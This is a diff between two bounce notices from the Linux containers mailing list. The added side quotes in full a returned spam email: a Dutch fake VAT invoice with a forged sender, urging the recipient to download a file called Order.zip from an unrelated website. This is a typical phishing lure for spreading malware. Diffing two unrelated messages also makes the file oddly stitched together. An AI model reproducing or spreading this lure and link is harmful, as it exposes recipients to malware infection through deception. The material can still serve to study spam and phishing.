@@ -1,9 +1,9 @@
-From: MAILER-DAEMON-AmzfLw34hDDNahEcDMElqg@public.gmane.org (Mail Delivery System)
-Subject: Undelivered Mail Returned to Sender
-Date: Thu, 17 Nov 2011 13:58:50 +0100 (CET)
-Message-ID: <20111117125850.77B3B108C8@mx05.online.nl>
+From: Mail Delivery Subsystem <MAILER-DAEMON-ZQ8ua0K4Z+p7TEWReGitBA@public.gmane.org>
+Subject: Returned mail: see transcript for details
+Date: Thu, 17 Nov 2011 15:10:12 +0100
+Message-ID: <201111171410.pAHEACFU028711@smtp1.agroweb.nl>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============3892937559604253653=="
+Content-Type: multipart/mixed; boundary="===============5108333426016936458=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -17,84 +17,91 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This is a MIME-encapsulated message.
+This is a MIME-encapsulated message
 
---===============3892937559604253653==
+--===============5108333426016936458==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="823DF108E5.1321534730/mx05.online.nl"
-Content-Transfer-Encoding: 7bit
+	boundary="pAHEACFU028711.1321539012/smtp1.agroweb.nl"
 
-This is a MIME-encapsulated message.
+This is a MIME-encapsulated message
 
---823DF108E5.1321534730/mx05.online.nl
-Content-Description: Notification
-Content-Type: text/plain; charset=us-ascii
+--pAHEACFU028711.1321539012/smtp1.agroweb.nl
 
-This is the mail system at host mx05.online.nl.
+The original message was received at Thu, 17 Nov 2011 15:10:12 +0100
+from [10.42.42.41]
 
-I'm sorry to have to inform you that your message could not
-be delivered to one or more recipients. It's attached below.
+   ----- The following addresses had permanent fatal errors -----
+<h.kuijpers-hermans-wwa7M/VGuFLz+pZb47iToQ@public.gmane.org>
+    (reason: 550 Requested action not taken: mailbox unavailable or not local)
 
-For further assistance, please send mail to postmaster.
+   ----- Transcript of session follows -----
+... while talking to [10.42.42.51]:
+>>> RCPT To:<h.kuijpers-hermans-wwa7M/VGuFLz+pZb47iToQ@public.gmane.org>
+<<< 550 Requested action not taken: mailbox unavailable or not local
+550 5.1.1 <h.kuijpers-hermans-wwa7M/VGuFLz+pZb47iToQ@public.gmane.org>... User unknown
 
-If you do so, please include this problem report. You can
-delete your own text from the attached returned message.
-
-                   The mail system
-
-<monique.de.jong-f/vm7P8qpiNmR6Xm/wNWPw@public.gmane.org> (expanded from <monique.de.jong-39ZsbGIQGT7z+pZb47iToQ@public.gmane.org>): host
-    mailstore14.back.prod.mail.online.nl[10.160.210.114] said: 552 5.2.2 Over
-    quota (in reply to end of DATA command)
-
---823DF108E5.1321534730/mx05.online.nl
-Content-Description: Delivery report
+--pAHEACFU028711.1321539012/smtp1.agroweb.nl
 Content-Type: message/delivery-status
 
-Reporting-MTA: dns; mx05.online.nl
-X-Postfix-Queue-ID: 823DF108E5
-X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Arrival-Date: Thu, 17 Nov 2011 13:58:49 +0100 (CET)
+Reporting-MTA: dns; smtp1.agroweb.nl
+Received-From-MTA: DNS; [10.42.42.41]
+Arrival-Date: Thu, 17 Nov 2011 15:10:12 +0100
 
-Final-Recipient: rfc822; monique.de.jong-f/vm7P8qpiNmR6Xm/wNWPw@public.gmane.org
-Original-Recipient: rfc822;monique.de.jong-39ZsbGIQGT7z+pZb47iToQ@public.gmane.org
+Final-Recipient: RFC822; h.kuijpers-hermans-wwa7M/VGuFLz+pZb47iToQ@public.gmane.org
 Action: failed
-Status: 5.2.2
-Remote-MTA: dns; mailstore14.back.prod.mail.online.nl
-Diagnostic-Code: smtp; 552 5.2.2 Over quota
+Status: 5.1.1
+Remote-MTA: DNS; [10.42.42.51]
+Diagnostic-Code: SMTP; 550 Requested action not taken: mailbox unavailable or not local
+Last-Attempt-Date: Thu, 17 Nov 2011 15:10:12 +0100
 
---823DF108E5.1321534730/mx05.online.nl
-Content-Description: Undelivered Message Headers
-Content-Type: text/rfc822-headers
-Content-Transfer-Encoding: quoted-printable
+--pAHEACFU028711.1321539012/smtp1.agroweb.nl
+Content-Type: message/rfc822
 
-Received: from mx05.online.nl (localhost [127.0.0.1])
-	by mx05.online.nl (Postfix) with ESMTP id 823DF108E5;
-	Thu, 17 Nov 2011 13:58:49 +0100 (CET)
-Received: from myoroclean.domain.de (static.99.74.4.46.clients.your-serve=
-r.de [46.4.74.99])
-	by mx05.online.nl (Postfix) with ESMTP;
-	Thu, 17 Nov 2011 13:58:49 +0100 (CET)
-Received: from [46.4.74.99] by myoroclean.domain.de id hxfHkmBuTGxm with =
-SMTP; Thu, 17 Nov 2011 14:09:37 +0100
-Date: Thu, 17 Nov 2011 14:09:37 +0100
-From: "Supportpay" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v3.6.6.3) Business
-X-Priority: 3 (Normal)
-Message-ID: <84642164.46716443162682-lsYetlmOafdBoFUHns3esWfrygkm6VTR@public.gmane.org>
-To: <monique.de.jong-39ZsbGIQGT7z+pZb47iToQ@public.gmane.org>
-Subject: Factuur - 442575-218434.
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from smtp4.agroweb.nl ([10.42.42.41])
+	by smtp1.agroweb.nl (8.13.8/8.13.8) with ESMTP id pAHEA9FU028704
+	for <h.kuijpers-hermans-wwa7M/VGuFLz+pZb47iToQ@public.gmane.org>; Thu, 17 Nov 2011 15:10:12 +0100
+Received: from smtp4.agroweb.nl (localhost [127.0.0.1])
+	by smtp4.agroweb.nl (8.13.1/8.13.1) with ESMTP id pAHEA9hS023172
+	for <h.kuijpers-hermans-wwa7M/VGuFLbjG7F2W0ioPDA1zUvx7JX@public.gmane.org>; Thu, 17 Nov 2011 15:10:09 +0100
+Received: (from root@localhost)
+	by smtp4.agroweb.nl (8.13.1/8.13.1/Submit) id pAHEA96l023171
+	for h.kuijpers-hermans-wwa7M/VGuFLbjG7F2W0ioPDA1zUvx7JX@public.gmane.org; Thu, 17 Nov 2011 15:10:09 +0100
+X-Spam-Checker-Version: SpamAssassin 3.2.4 (2008-01-01) on smtp4.agroweb.nl
+X-Spam-Level: **
+X-Spam-Status: No, score=2.8 required=8.0 tests=RATWARE_MS_HASH,
+	RATWARE_OUTLOOK_NONAME autolearn=no version=3.2.4
+Received: from MCNserver1 (mycrewnet.com [184.106.131.209])
+	by smtp4.agroweb.nl (8.13.1/8.13.1) with ESMTP id pAHEA2li023090
+	for <h.kuijpers-hermans-wwa7M/VGuFLz+pZb47iToQ@public.gmane.org>; Thu, 17 Nov 2011 15:10:05 +0100
+Received: from [184.106.131.209] by MCNserver1 id M3XnFw6iebQ2l; Thu, 17 Nov 2011 14:11:32 +0000
+Message-ID: <00a701cca532$cd681500$14000a0a@MCNserver1>
+From: "Pay" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <h.kuijpers-hermans-wwa7M/VGuFLz+pZb47iToQ@public.gmane.org>
+Subject: BTW factuur #586872.
+Date: Thu, 17 Nov 2011 14:11:32 +0000
 MIME-Version: 1.0
 Content-Type: text/plain;
-	charset=3D"windows-1252"
-Content-Transfer-Encoding: 8bit
-X-Online-Scanned: by Cloudmark authority (on mx05.online.nl)
-X-Online-CMAE-Analyze: .v=3D1.0 c=3D1 p=3Dr5sg91_jAAAA:8 a=3DN659UExz7-8A=
-:10 a=3DdUGgbKbiNYaaHwAMRaUA:9 a=3DpILNOxqGKmIA:10
-X-Online-CMAE-Score: .100
+	charset="windows-1252"
+X-vamsi: scanned
+Content-Transfer-Encoding: quoted-printable
 
---823DF108E5.1321534730/mx05.online.nl--
 
---===============3892937559604253653==
+
+Hallo,
+
+Op verzoek sturen wij u een BTW-factuur.
+
+Hartelijk dank voor uw medewerking!
+http://www.giovanniluca-paola.it/clientedown/Order.zip?ticetid914Billingi=
+d=3Dh.kuijpers-hermans-wwa7M/VGuFLz+pZb47iToQ@public.gmane.org
+
+
+
+--pAHEACFU028711.1321539012/smtp1.agroweb.nl--
+
+
+--===============5108333426016936458==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -104,4 +111,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============3892937559604253653==--
+--===============5108333426016936458==--
